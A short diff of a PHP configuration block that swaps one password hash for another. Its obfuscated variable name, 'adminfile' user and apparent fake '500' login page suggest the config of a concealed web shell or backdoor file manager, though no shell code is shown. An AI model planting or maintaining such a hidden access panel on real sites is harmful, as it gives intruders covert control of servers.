@@ -8,7 +8,7 @@
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'adminfile',
-    'password' => 'de12f5798f86bdcc5c759a645e913e4c',
+    'password' => 'c296c1aa535b0bba6ccf85d8f9e7afff',
     'safe_mode' => '1',
     'login_page' => '500',
     'show_icons' => '1',
